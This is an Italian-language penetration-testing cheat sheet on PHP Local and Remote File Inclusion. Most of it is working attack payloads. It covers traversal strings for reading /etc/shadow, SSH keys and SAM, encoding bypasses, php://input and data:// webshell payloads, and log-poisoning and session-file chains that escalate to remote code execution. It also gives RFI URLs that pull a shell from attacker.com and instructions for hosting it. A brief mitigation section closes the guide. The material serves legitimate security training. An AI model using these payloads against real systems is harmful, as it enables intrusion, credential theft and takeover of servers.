# Local File Inclusion (LFI) e Remote File Inclusion (RFI)

## Scopo

Questa guida copre le vulnerabilità LFI e RFI, che permettono l'inclusione di file locali o remoti in applicazioni web, potenzialmente portando a RCE.

## Prerequisiti

- Conoscenza base PHP e server web
- Burp Suite
- Server di test vulnerabile
- **Autorizzazione per testing**

---

## Concetto

```php
// Codice vulnerabile
<?php
include($_GET['page']);
?>

// URL
http://target/index.php?page=about.php

// LFI
http://target/index.php?page=../../../etc/passwd

// RFI
http://target/index.php?page=http://attacker.com/shell.txt
```

---

## Local File Inclusion (LFI)

### Path Traversal Base

```bash
# Linux
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

### File Sensibili Linux

```
/etc/passwd
/etc/shadow (se readable)
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/home/user/.ssh/id_rsa
/home/user/.bash_history
```

### File Sensibili Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\inetpub\logs\LogFiles\
C:\xampp\apache\logs\access.log
C:\Users\<user>\Desktop\
```

---

## Bypass Filtri

### Null Byte (PHP < 5.3)

```
../../../etc/passwd%00
../../../etc/passwd%00.php
```

### Double Encoding

```
%252e%252e%252f  =  ../
%252e%252e%255c  =  ..\
```

### Traversal Variations

```
....//....//....//etc/passwd
..../\..../\..../\etc/passwd
..%c0%af..%c0%afetc/passwd
..%252f..%252f..%252fetc/passwd
```

### Wrapper Bypass

```php
# php://filter
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php

# Decoding
echo "BASE64_OUTPUT" | base64 -d
```

---

## PHP Wrappers

### php://filter (Leggere source code)

```
# Base64
php://filter/convert.base64-encode/resource=index.php

# Altre conversioni
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
```

### php://input (POST data come file)

```
# URL
http://target/index.php?page=php://input

# POST body
<?php system($_GET['cmd']); ?>
```

### data:// (Data URI)

```
# Base64 encoded
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Plain text
data://text/plain,<?php system($_GET['cmd']);?>
```

### expect:// (Command execution)

```
# Richiede expect extension
expect://id
expect://whoami
```

### zip:// e phar://

```
# Zip wrapper
zip://malicious.zip%23shell.php

# Phar wrapper
phar://uploads/malicious.phar/shell.php
```

---

## LFI to RCE

### Log Poisoning

```bash
# 1. Avvelena log Apache
curl "http://target/" -A "<?php system(\$_GET['cmd']); ?>"

# 2. Includi log
http://target/index.php?page=/var/log/apache2/access.log&cmd=id

# Log paths comuni
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
/var/log/sshd.log
/var/log/mail.log
```

### /proc/self/environ

```bash
# User-Agent injection
curl "http://target/index.php?page=/proc/self/environ" \
    -A "<?php system(\$_GET['cmd']); ?>"
```

### Session Files

```bash
# 1. Inietta in session
# (es. in campo username di form)
<?php system($_GET['cmd']); ?>

# 2. Trova session file
/tmp/sess_[SESSION_ID]
/var/lib/php/sessions/sess_[SESSION_ID]

# 3. Includi
http://target/index.php?page=/tmp/sess_abc123&cmd=id
```

### Wrapper Chains (PHP Filter Chain Generator)

```bash
# Tool: php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'

# Output: lunga catena di filtri
php://filter/convert.iconv...
```

---

## Remote File Inclusion (RFI)

### Verifica Vulnerabilità

```
# php.ini requirements
allow_url_include = On
allow_url_fopen = On
```

### Exploitation

```
# Webshell remota
http://target/index.php?page=http://attacker.com/shell.txt

# Con null byte (vecchio PHP)
http://target/index.php?page=http://attacker.com/shell.txt%00

# FTP
http://target/index.php?page=ftp://attacker.com/shell.txt
```

### Setup Attacker Server

```bash
# Crea shell
echo '<?php system($_GET["cmd"]); ?>' > shell.txt

# Python HTTP server
python3 -m http.server 80
```

---

## Tools

### LFISuite

```bash
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python lfisuite.py
```

### Kadimus

```bash
git clone https://github.com/P0cL4bs/Kadimus.git
cd Kadimus
./configure && make
./kadimus -u "http://target/index.php?page="
```

### Burp Suite

```
1. Intercetta request
2. Intruder con wordlist LFI
3. Analizza response length/content
```

---

## Mitigazioni

### Whitelist

```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    include('404.php');
}
```

### Realpath Validation

```php
$base = '/var/www/html/pages/';
$file = realpath($base . $_GET['page']);

if (strpos($file, $base) === 0 && file_exists($file)) {
    include($file);
}
```

### Configurazione PHP

```ini
# php.ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html/
```

---

## Best Practices

- **Enumeration**: Usa wordlist per file comuni
- **Context**: Considera OS e framework
- **Escalation**: LFI → RCE quando possibile
- **Documentation**: Log tutti i file accessibili
- **Remediation**: Suggerisci whitelist + input validation

## Riferimenti

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
